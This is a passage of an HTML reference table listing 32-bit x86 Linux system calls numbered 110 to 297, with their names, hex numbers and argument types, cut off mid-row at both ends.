*</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>110</td><td>iopl</td><td>0x6e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>111</td><td>vhangup</td><td>0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>112</td><td>idle</td><td>0x70</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>113</td><td>vm86old</td><td>0x71</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>114</td><td>wait4</td><td>0x72</td><td>pid_t  pid</td><td>int  *stat_addr</td><td>int  options</td><td>struct  rusage *ru</td><td>-</td><td>-</td></tr><tr><td>115</td><td>swapoff</td><td>0x73</td><td>const  char *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>116</td><td>sysinfo</td><td>0x74</td><td>struct  sysinfo *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>117</td><td>ipc</td><td>0x75</td><td>unsigned  int call</td><td>int  first</td><td>unsigned  long second</td><td>unsigned  long third</td><td>void  *ptr</td><td>long  fifth</td></tr><tr><td>118</td><td>fsync</td><td>0x76</td><td>unsigned  int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>119</td><td>sigreturn</td><td>0x77</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>120</td><td>clone</td><td>0x78</td><td>unsigned  long</td><td>unsigned  long</td><td>int  *</td><td>int  *</td><td>unsigned  long</td><td>-</td></tr><tr><td>121</td><td>setdomainname</td><td>0x79</td><td>char  *name</td><td>int  len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>122</td><td>uname</td><td>0x7a</td><td>struct  old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>123</td><td>modify_ldt</td><td>0x7b</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>124</td><td>adjtimex</td><td>0x7c</td><td>struct  timex *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>125</td><td>mprotect</td><td>0x7d</td><td>unsigned  long start</td><td>size_t  len</td><td>unsigned  long prot</td><td>-</td><td>-</td><td>-</td></tr><tr><td>126</td><td>sigprocmask</td><td>0x7e</td><td>int  how</td><td>old_sigset_t  *set</td><td>old_sigset_t  *oset</td><td>-</td><td>-</td><td>-</td></tr><tr><td>127</td><td>create_module</td><td>0x7f</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>128</td><td>init_module</td><td>0x80</td><td>void  *umod</td><td>unsigned  long len</td><td>const  char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td>129</td><td>delete_module</td><td>0x81</td><td>const  char *name_user</td><td>unsigned  int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>130</td><td>get_kernel_syms</td><td>0x82</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>131</td><td>quotactl</td><td>0x83</td><td>unsigned  int cmd</td><td>const  char *special</td><td>qid_t  id</td><td>void  *addr</td><td>-</td><td>-</td></tr><tr><td>132</td><td>getpgid</td><td>0x84</td><td>pid_t  pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>133</td><td>fchdir</td><td>0x85</td><td>unsigned  int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>134</td><td>bdflush</td><td>0x86</td><td>int  func</td><td>long  data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>135</td><td>sysfs</td><td>0x87</td><td>int  option</td><td>unsigned  long arg1</td><td>unsigned  long arg2</td><td>-</td><td>-</td><td>-</td></tr><tr><td>136</td><td>personality</td><td>0x88</td><td>unsigned  int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>137</td><td>afs_syscall</td><td>0x89</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>138</td><td>setfsuid</td><td>0x8a</td><td>uid_t  uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>139</td><td>setfsgid</td><td>0x8b</td><td>gid_t  gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>140</td><td>_llseek</td><td>0x8c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>141</td><td>getdents</td><td>0x8d</td><td>unsigned  int fd</td><td>struct  linux_dirent *dirent</td><td>unsigned  int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td>142</td><td>_newselect</td><td>0x8e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>143</td><td>flock</td><td>0x8f</td><td>unsigned  int fd</td><td>unsigned  int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>144</td><td>msync</td><td>0x90</td><td>unsigned  long start</td><td>size_t  len</td><td>int  flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>145</td><td>readv</td><td>0x91</td><td>unsigned  long fd</td><td>const  struct iovec *vec</td><td>unsigned  long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td>146</td><td>writev</td><td>0x92</td><td>unsigned  long fd</td><td>const  struct iovec *vec</td><td>unsigned  long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td>147</td><td>getsid</td><td>0x93</td><td>pid_t  pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>148</td><td>fdatasync</td><td>0x94</td><td>unsigned  int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>149</td><td>_sysctl</td><td>0x95</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>150</td><td>mlock</td><td>0x96</td><td>unsigned  long start</td><td>size_t  len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>151</td><td>munlock</td><td>0x97</td><td>unsigned  long start</td><td>size_t  len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>152</td><td>mlockall</td><td>0x98</td><td>int  flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>153</td><td>munlockall</td><td>0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>154</td><td>sched_setparam</td><td>0x9a</td><td>pid_t  pid</td><td>struct  sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>155</td><td>sched_getparam</td><td>0x9b</td><td>pid_t  pid</td><td>struct  sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>156</td><td>sched_setscheduler</td><td>0x9c</td><td>pid_t  pid</td><td>int  policy</td><td>struct  sched_param *param</td><td>-</td><td>-</td><td>-</td></tr><tr><td>157</td><td>sched_getscheduler</td><td>0x9d</td><td>pid_t  pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>158</td><td>sched_yield</td><td>0x9e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>159</td><td>sched_get_priority_max</td><td>0x9f</td><td>int  policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>160</td><td>sched_get_priority_min</td><td>0xa0</td><td>int  policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>161</td><td>sched_rr_get_interval</td><td>0xa1</td><td>pid_t  pid</td><td>struct  timespec *interval</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>162</td><td>nanosleep</td><td>0xa2</td><td>struct  __kernel_timespec *rqtp</td><td>struct  __kernel_timespec *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>163</td><td>mremap</td><td>0xa3</td><td>unsigned  long addr</td><td>unsigned  long old_len</td><td>unsigned  long new_len</td><td>unsigned  long flags</td><td>unsigned  long new_addr</td><td>-</td></tr><tr><td>164</td><td>setresuid</td><td>0xa4</td><td>uid_t  ruid</td><td>uid_t  euid</td><td>uid_t  suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td>165</td><td>getresuid</td><td>0xa5</td><td>uid_t  *ruid</td><td>uid_t  *euid</td><td>uid_t  *suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td>166</td><td>vm86</td><td>0xa6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>167</td><td>query_module</td><td>0xa7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>168</td><td>poll</td><td>0xa8</td><td>struct  pollfd *ufds</td><td>unsigned  int nfds</td><td>int  timeout</td><td>-</td><td>-</td><td>-</td></tr><tr><td>169</td><td>nfsservctl</td><td>0xa9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>170</td><td>setresgid</td><td>0xaa</td><td>gid_t  rgid</td><td>gid_t  egid</td><td>gid_t  sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td>171</td><td>getresgid</td><td>0xab</td><td>gid_t  *rgid</td><td>gid_t  *egid</td><td>gid_t  *sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td>172</td><td>prctl</td><td>0xac</td><td>int  option</td><td>unsigned  long arg2</td><td>unsigned  long arg3</td><td>unsigned  long arg4</td><td>unsigned  long arg5</td><td>-</td></tr><tr><td>173</td><td>rt_sigreturn</td><td>0xad</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>174</td><td>rt_sigaction</td><td>0xae</td><td>int</td><td>const  struct sigaction *</td><td>struct  sigaction *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td>175</td><td>rt_sigprocmask</td><td>0xaf</td><td>int  how</td><td>sigset_t  *set</td><td>sigset_t  *oset</td><td>size_t  sigsetsize</td><td>-</td><td>-</td></tr><tr><td>176</td><td>rt_sigpending</td><td>0xb0</td><td>sigset_t  *set</td><td>size_t  sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>177</td><td>rt_sigtimedwait</td><td>0xb1</td><td>const  sigset_t *uthese</td><td>siginfo_t  *uinfo</td><td>const  struct timespec *uts</td><td>size_t  sigsetsize</td><td>-</td><td>-</td></tr><tr><td>178</td><td>rt_sigqueueinfo</td><td>0xb2</td><td>pid_t  pid</td><td>int  sig</td><td>siginfo_t  *uinfo</td><td>-</td><td>-</td><td>-</td></tr><tr><td>179</td><td>rt_sigsuspend</td><td>0xb3</td><td>sigset_t  *unewset</td><td>size_t  sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>180</td><td>pread64</td><td>0xb4</td><td>unsigned  int fd</td><td>char  *buf</td><td>size_t  count</td><td>loff_t  pos</td><td>-</td><td>-</td></tr><tr><td>181</td><td>pwrite64</td><td>0xb5</td><td>unsigned  int fd</td><td>const  char *buf</td><td>size_t  count</td><td>loff_t  pos</td><td>-</td><td>-</td></tr><tr><td>182</td><td>chown</td><td>0xb6</td><td>const  char *filename</td><td>uid_t  user</td><td>gid_t  group</td><td>-</td><td>-</td><td>-</td></tr><tr><td>183</td><td>getcwd</td><td>0xb7</td><td>char  *buf</td><td>unsigned  long size</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>184</td><td>capget</td><td>0xb8</td><td>cap_user_header_t  header</td><td>cap_user_data_t  dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>185</td><td>capset</td><td>0xb9</td><td>cap_user_header_t  header</td><td>const  cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>186</td><td>sigaltstack</td><td>0xba</td><td>const  struct sigaltstack *uss</td><td>struct  sigaltstack *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>187</td><td>sendfile</td><td>0xbb</td><td>int  out_fd</td><td>int  in_fd</td><td>off_t  *offset</td><td>size_t  count</td><td>-</td><td>-</td></tr><tr><td>188</td><td>getpmsg</td><td>0xbc</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>189</td><td>putpmsg</td><td>0xbd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>190</td><td>vfork</td><td>0xbe</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>191</td><td>ugetrlimit</td><td>0xbf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>192</td><td>mmap2</td><td>0xc0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>193</td><td>truncate64</td><td>0xc1</td><td>const  char *path</td><td>loff_t  length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>194</td><td>ftruncate64</td><td>0xc2</td><td>unsigned  int fd</td><td>loff_t  length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>195</td><td>stat64</td><td>0xc3</td><td>const  char *filename</td><td>struct  stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>196</td><td>lstat64</td><td>0xc4</td><td>const  char *filename</td><td>struct  stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>197</td><td>fstat64</td><td>0xc5</td><td>unsigned  long fd</td><td>struct  stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>198</td><td>lchown32</td><td>0xc6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>199</td><td>getuid32</td><td>0xc7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>200</td><td>getgid32</td><td>0xc8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>201</td><td>geteuid32</td><td>0xc9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>202</td><td>getegid32</td><td>0xca</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>203</td><td>setreuid32</td><td>0xcb</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>204</td><td>setregid32</td><td>0xcc</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>205</td><td>getgroups32</td><td>0xcd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>206</td><td>setgroups32</td><td>0xce</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>207</td><td>fchown32</td><td>0xcf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>208</td><td>setresuid32</td><td>0xd0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>209</td><td>getresuid32</td><td>0xd1</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>210</td><td>setresgid32</td><td>0xd2</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>211</td><td>getresgid32</td><td>0xd3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>212</td><td>chown32</td><td>0xd4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>213</td><td>setuid32</td><td>0xd5</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>214</td><td>setgid32</td><td>0xd6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>215</td><td>setfsuid32</td><td>0xd7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>216</td><td>setfsgid32</td><td>0xd8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>217</td><td>pivot_root</td><td>0xd9</td><td>const  char *new_root</td><td>const  char *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>218</td><td>mincore</td><td>0xda</td><td>unsigned  long start</td><td>size_t  len</td><td>unsigned  char * vec</td><td>-</td><td>-</td><td>-</td></tr><tr><td>219</td><td>madvise</td><td>0xdb</td><td>unsigned  long start</td><td>size_t  len</td><td>int  behavior</td><td>-</td><td>-</td><td>-</td></tr><tr><td>220</td><td>getdents64</td><td>0xdc</td><td>unsigned  int fd</td><td>struct  linux_dirent64 *dirent</td><td>unsigned  int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td>221</td><td>fcntl64</td><td>0xdd</td><td>unsigned  int fd</td><td>unsigned  int cmd</td><td>unsigned  long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td>222</td><td>not  implemented</td><td>0xde</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>223</td><td>not  implemented</td><td>0xdf</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>224</td><td>gettid</td><td>0xe0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>225</td><td>readahead</td><td>0xe1</td><td>int  fd</td><td>loff_t  offset</td><td>size_t  count</td><td>-</td><td>-</td><td>-</td></tr><tr><td>226</td><td>setxattr</td><td>0xe2</td><td>const  char *path</td><td>const  char *name</td><td>const  void *value</td><td>size_t  size</td><td>int  flags</td><td>-</td></tr><tr><td>227</td><td>lsetxattr</td><td>0xe3</td><td>const  char *path</td><td>const  char *name</td><td>const  void *value</td><td>size_t  size</td><td>int  flags</td><td>-</td></tr><tr><td>228</td><td>fsetxattr</td><td>0xe4</td><td>int  fd</td><td>const  char *name</td><td>const  void *value</td><td>size_t  size</td><td>int  flags</td><td>-</td></tr><tr><td>229</td><td>getxattr</td><td>0xe5</td><td>const  char *path</td><td>const  char *name</td><td>void  *value</td><td>size_t  size</td><td>-</td><td>-</td></tr><tr><td>230</td><td>lgetxattr</td><td>0xe6</td><td>const  char *path</td><td>const  char *name</td><td>void  *value</td><td>size_t  size</td><td>-</td><td>-</td></tr><tr><td>231</td><td>fgetxattr</td><td>0xe7</td><td>int  fd</td><td>const  char *name</td><td>void  *value</td><td>size_t  size</td><td>-</td><td>-</td></tr><tr><td>232</td><td>listxattr</td><td>0xe8</td><td>const  char *path</td><td>char  *list</td><td>size_t  size</td><td>-</td><td>-</td><td>-</td></tr><tr><td>233</td><td>llistxattr</td><td>0xe9</td><td>const  char *path</td><td>char  *list</td><td>size_t  size</td><td>-</td><td>-</td><td>-</td></tr><tr><td>234</td><td>flistxattr</td><td>0xea</td><td>int  fd</td><td>char  *list</td><td>size_t  size</td><td>-</td><td>-</td><td>-</td></tr><tr><td>235</td><td>removexattr</td><td>0xeb</td><td>const  char *path</td><td>const  char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>236</td><td>lremovexattr</td><td>0xec</td><td>const  char *path</td><td>const  char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>237</td><td>fremovexattr</td><td>0xed</td><td>int  fd</td><td>const  char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>238</td><td>tkill</td><td>0xee</td><td>pid_t  pid</td><td>int  sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>239</td><td>sendfile64</td><td>0xef</td><td>int  out_fd</td><td>int  in_fd</td><td>loff_t  *offset</td><td>size_t  count</td><td>-</td><td>-</td></tr><tr><td>240</td><td>futex</td><td>0xf0</td><td>u32  *uaddr</td><td>int  op</td><td>u32  val</td><td>struct  timespec *utime</td><td>u32  *uaddr2</td><td>u32  val3</td></tr><tr><td>241</td><td>sched_setaffinity</td><td>0xf1</td><td>pid_t  pid</td><td>unsigned  int len</td><td>unsigned  long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td>242</td><td>sched_getaffinity</td><td>0xf2</td><td>pid_t  pid</td><td>unsigned  int len</td><td>unsigned  long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td>243</td><td>set_thread_area</td><td>0xf3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>244</td><td>get_thread_area</td><td>0xf4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>245</td><td>io_setup</td><td>0xf5</td><td>unsigned  nr_reqs</td><td>aio_context_t  *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>246</td><td>io_destroy</td><td>0xf6</td><td>aio_context_t  ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>247</td><td>io_getevents</td><td>0xf7</td><td>aio_context_t  ctx_id</td><td>long  min_nr</td><td>long  nr</td><td>struct  io_event *events</td><td>struct  timespec *timeout</td><td>-</td></tr><tr><td>248</td><td>io_submit</td><td>0xf8</td><td>aio_context_t</td><td>long</td><td>struct  iocb * *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>249</td><td>io_cancel</td><td>0xf9</td><td>aio_context_t  ctx_id</td><td>struct  iocb *iocb</td><td>struct  io_event *result</td><td>-</td><td>-</td><td>-</td></tr><tr><td>250</td><td>fadvise64</td><td>0xfa</td><td>int  fd</td><td>loff_t  offset</td><td>size_t  len</td><td>int  advice</td><td>-</td><td>-</td></tr><tr><td>251</td><td>not  implemented</td><td>0xfb</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>252</td><td>exit_group</td><td>0xfc</td><td>int  error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>253</td><td>lookup_dcookie</td><td>0xfd</td><td>u64  cookie64</td><td>char  *buf</td><td>size_t  len</td><td>-</td><td>-</td><td>-</td></tr><tr><td>254</td><td>epoll_create</td><td>0xfe</td><td>int  size</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>255</td><td>epoll_ctl</td><td>0xff</td><td>int  epfd</td><td>int  op</td><td>int  fd</td><td>struct  epoll_event *event</td><td>-</td><td>-</td></tr><tr><td>256</td><td>epoll_wait</td><td>0x100</td><td>int  epfd</td><td>struct  epoll_event *events</td><td>int  maxevents</td><td>int  timeout</td><td>-</td><td>-</td></tr><tr><td>257</td><td>remap_file_pages</td><td>0x101</td><td>unsigned  long start</td><td>unsigned  long size</td><td>unsigned  long prot</td><td>unsigned  long pgoff</td><td>unsigned  long flags</td><td>-</td></tr><tr><td>258</td><td>set_tid_address</td><td>0x102</td><td>int  *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>259</td><td>timer_create</td><td>0x103</td><td>clockid_t  which_clock</td><td>struct  sigevent *timer_event_spec</td><td>timer_t  * created_timer_id</td><td>-</td><td>-</td><td>-</td></tr><tr><td>260</td><td>timer_settime</td><td>0x104</td><td>timer_t  timer_id</td><td>int  flags</td><td>const  struct __kernel_itimerspec *new_setting</td><td>struct  itimerspec *old_setting</td><td>-</td><td>-</td></tr><tr><td>261</td><td>timer_gettime</td><td>0x105</td><td>timer_t  timer_id</td><td>struct  __kernel_itimerspec *setting</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>262</td><td>timer_getoverrun</td><td>0x106</td><td>timer_t  timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>263</td><td>timer_delete</td><td>0x107</td><td>timer_t  timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>264</td><td>clock_settime</td><td>0x108</td><td>clockid_t  which_clock</td><td>const  struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>265</td><td>clock_gettime</td><td>0x109</td><td>clockid_t  which_clock</td><td>struct  __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>266</td><td>clock_getres</td><td>0x10a</td><td>clockid_t  which_clock</td><td>struct  __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>267</td><td>clock_nanosleep</td><td>0x10b</td><td>clockid_t  which_clock</td><td>int  flags</td><td>const  struct __kernel_timespec *rqtp</td><td>struct  __kernel_timespec *rmtp</td><td>-</td><td>-</td></tr><tr><td>268</td><td>statfs64</td><td>0x10c</td><td>const  char *path</td><td>size_t  sz</td><td>struct  statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td>269</td><td>fstatfs64</td><td>0x10d</td><td>unsigned  int fd</td><td>size_t  sz</td><td>struct  statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td>270</td><td>tgkill</td><td>0x10e</td><td>pid_t  tgid</td><td>pid_t  pid</td><td>int  sig</td><td>-</td><td>-</td><td>-</td></tr><tr><td>271</td><td>utimes</td><td>0x10f</td><td>char  *filename</td><td>struct  timeval *utimes</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>272</td><td>fadvise64_64</td><td>0x110</td><td>int  fd</td><td>loff_t  offset</td><td>loff_t  len</td><td>int  advice</td><td>-</td><td>-</td></tr><tr><td>273</td><td>vserver</td><td>0x111</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>274</td><td>mbind</td><td>0x112</td><td>unsigned  long start</td><td>unsigned  long len</td><td>unsigned  long mode</td><td>const  unsigned long *nmask</td><td>unsigned  long maxnode</td><td>unsigned  flags</td></tr><tr><td>275</td><td>get_mempolicy</td><td>0x113</td><td>int  *policy</td><td>unsigned  long *nmask</td><td>unsigned  long maxnode</td><td>unsigned  long addr</td><td>unsigned  long flags</td><td>-</td></tr><tr><td>276</td><td>set_mempolicy</td><td>0x114</td><td>int  mode</td><td>const  unsigned long *nmask</td><td>unsigned  long maxnode</td><td>-</td><td>-</td><td>-</td></tr><tr><td>277</td><td>mq_open</td><td>0x115</td><td>const  char *name</td><td>int  oflag</td><td>umode_t  mode</td><td>struct  mq_attr *attr</td><td>-</td><td>-</td></tr><tr><td>278</td><td>mq_unlink</td><td>0x116</td><td>const  char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>279</td><td>mq_timedsend</td><td>0x117</td><td>mqd_t  mqdes</td><td>const  char *msg_ptr</td><td>size_t  msg_len</td><td>unsigned  int msg_prio</td><td>const  struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td>280</td><td>mq_timedreceive</td><td>0x118</td><td>mqd_t  mqdes</td><td>char  *msg_ptr</td><td>size_t  msg_len</td><td>unsigned  int *msg_prio</td><td>const  struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td>281</td><td>mq_notify</td><td>0x119</td><td>mqd_t  mqdes</td><td>const  struct sigevent *notification</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>282</td><td>mq_getsetattr</td><td>0x11a</td><td>mqd_t  mqdes</td><td>const  struct mq_attr *mqstat</td><td>struct  mq_attr *omqstat</td><td>-</td><td>-</td><td>-</td></tr><tr><td>283</td><td>kexec_load</td><td>0x11b</td><td>unsigned  long entry</td><td>unsigned  long nr_segments</td><td>struct  kexec_segment *segments</td><td>unsigned  long flags</td><td>-</td><td>-</td></tr><tr><td>284</td><td>waitid</td><td>0x11c</td><td>int  which</td><td>pid_t  pid</td><td>struct  siginfo *infop</td><td>int  options</td><td>struct  rusage *ru</td><td>-</td></tr><tr><td>285</td><td>not  implemented</td><td>0x11d</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>286</td><td>add_key</td><td>0x11e</td><td>const  char *_type</td><td>const  char *_description</td><td>const  void *_payload</td><td>size_t  plen</td><td>key_serial_t  destringid</td><td>-</td></tr><tr><td>287</td><td>request_key</td><td>0x11f</td><td>const  char *_type</td><td>const  char *_description</td><td>const  char *_callout_info</td><td>key_serial_t  destringid</td><td>-</td><td>-</td></tr><tr><td>288</td><td>keyctl</td><td>0x120</td><td>int  cmd</td><td>unsigned  long arg2</td><td>unsigned  long arg3</td><td>unsigned  long arg4</td><td>unsigned  long arg5</td><td>-</td></tr><tr><td>289</td><td>ioprio_set</td><td>0x121</td><td>int  which</td><td>int  who</td><td>int  ioprio</td><td>-</td><td>-</td><td>-</td></tr><tr><td>290</td><td>ioprio_get</td><td>0x122</td><td>int  which</td><td>int  who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>291</td><td>inotify_init</td><td>0x123</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>292</td><td>inotify_add_watch</td><td>0x124</td><td>int  fd</td><td>const  char *path</td><td>u32  mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td>293</td><td>inotify_rm_watch</td><td>0x125</td><td>int  fd</td><td>__s32  wd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>294</td><td>migrate_pages</td><td>0x126</td><td>pid_t  pid</td><td>unsigned  long maxnode</td><td>const  unsigned long *from</td><td>const  unsigned long *to</td><td>-</td><td>-</td></tr><tr><td>295</td><td>openat</td><td>0x127</td><td>int  dfd</td><td>const  char *filename</td><td>int  flags</td><td>umode_t  mode</td><td>-</td><td>-</td></tr><tr><td>296</td><td>mkdirat</td><td>0x128</td><td>int  dfd</td><td>const  char * pathname</td><td>umode_t  mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td>297</td><td>mknodat</td><td>0x129</td><td>int  dfd</td><td>const  char * filename</td><td>umode_t  mode</td><td>unsigned  